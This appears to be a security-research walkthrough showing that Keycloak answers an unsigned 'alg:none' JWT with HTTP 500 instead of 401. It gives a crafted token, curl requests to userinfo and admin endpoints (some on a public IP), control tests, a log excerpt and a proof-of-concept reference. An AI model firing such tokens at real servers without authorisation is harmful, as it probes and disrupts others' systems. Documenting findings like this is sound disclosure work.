# Tutorial: Finding #2 — alg:none JWT → HTTP 500 (NullPointerException)

**Severity:** MEDIUM (CVSS 5.3)
**Demo time:** ~3 minutes
**Requirements:** Terminal only (no login needed)

---

## Step 0: Ensure Keycloak is Running

```bash
curl -s http://localhost:8080/realms/test | python3 -c "import sys,json; print('Keycloak OK:', json.load(sys.stdin)['realm'])"
```

---

## Step 1: Create a JWT with alg:none

This token is created without any credentials — this is an unauthenticated attack.

```bash
# Header: {"alg":"none","typ":"JWT"}
# Payload: {"sub":"attacker","exp":9999999999}
# Signature: (empty)
ALG_NONE="eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhdHRhY2tlciIsImV4cCI6OTk5OTk5OTk5OX0."
```

Verify the JWT contents:
```bash
echo "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0" | base64 -d 2>/dev/null
```
Output: `{"alg":"none","typ":"JWT"}`

```bash
echo "eyJzdWIiOiJhdHRhY2tlciIsImV4cCI6OTk5OTk5OTk5OX0=" | base64 -d 2>/dev/null
```
Output: `{"sub":"attacker","exp":9999999999}`

> **Key point:** This token has `alg: none` — meaning there is no signature. The server should immediately reject it with 401.

---

## Step 2: Send to /userinfo Endpoint

```bash
ALG_NONE="eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhdHRhY2tlciIsImV4cCI6OTk5OTk5OTk5OX0."

curl -si http://46.101.162.187:8080/realms/test/protocol/openid-connect/userinfo \
  -H "Authorization: Bearer $ALG_NONE"
```

**Expected (secure):**
```
HTTP/1.1 401 Unauthorized
{"error":"invalid_token"}
```

**Actual result (VULNERABLE):**
```
HTTP/1.1 500 Internal Server Error
{"error":"unknown_error","error_description":"For more on this error consult the server log."}
```

> **HTTP 500 instead of 401!** The server crashes with a NullPointerException.

---

## Step 3: Send to Admin API /users

```bash
curl -si http://46.101.162.187:8080/admin/realms/test/users \
  -H "Authorization: Bearer $ALG_NONE"
```

**Output (VULNERABLE):**
```
HTTP/1.1 500 Internal Server Error
{"error":"unknown_error"}
```

---

## Step 4: Send to Admin API /clients

```bash
curl -si http://46.101.162.187:8080/admin/realms/test/clients \
  -H "Authorization: Bearer $ALG_NONE"
```

**Output (VULNERABLE):**
```
HTTP/1.1 500 Internal Server Error
```

---

## Step 5: Control Test — Random String (Should return 401)

To prove that the 500 is specific to `alg:none`, not a general error:

```bash
curl -si http://46.101.162.187:8080/realms/test/protocol/openid-connect/userinfo \
  -H "Authorization: Bearer ini-bukan-jwt-yang-valid"
```

**Output (Correct):**
```
HTTP/1.1 401 Unauthorized
```

> Random string → 401 (correct). But alg:none → 500 (bug).

---

## Step 6: Control Test — JWT with Wrong Signature (Should return 401)

```bash
curl -si http://46.101.162.187:8080/realms/test/protocol/openid-connect/userinfo \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJ0ZXN0In0.signature-salah"
```

**Output (Correct):**
```
HTTP/1.1 401 Unauthorized
```

> JWT with alg:RS256 but wrong signature → 401 (correct). Only alg:none causes the 500.

---

## Step 7: Check Server Log (Optional)

```bash
tail -20 /home/anggi/keycloak-research/keycloak.log | grep -A5 "NullPointerException"
```

**Expected output:**
```
ERROR [org.keycloak.services.error.KeycloakErrorHandler]
Uncaught server error: java.lang.NullPointerException:
Cannot invoke "org.keycloak.crypto.SignatureProvider.verifier(String)"
because the return value of
"org.keycloak.models.KeycloakSession.getProvider(java.lang.Class, String)" is null
```

---

## Step 8: Run Python PoC (Automated Full Test)

```bash
python3 pocs/poc_f2_alg_none_npe.py --host http://localhost:8080
```

---

## Summary

| Endpoint | Token | Expected | Actual | Status |
|---|---|---|---|---|
| /userinfo | alg:none | 401 | **500** | VULNERABLE |
| /admin/users | alg:none | 401 | **500** | VULNERABLE |
| /admin/clients | alg:none | 401 | **500** | VULNERABLE |
| /userinfo | random string | 401 | 401 | Correct |
| /userinfo | wrong signature | 401 | 401 | Correct |

**Conclusion:** All Bearer-authenticated endpoints crash with a NullPointerException when receiving a JWT with `alg:none`. No credentials are needed to trigger this.
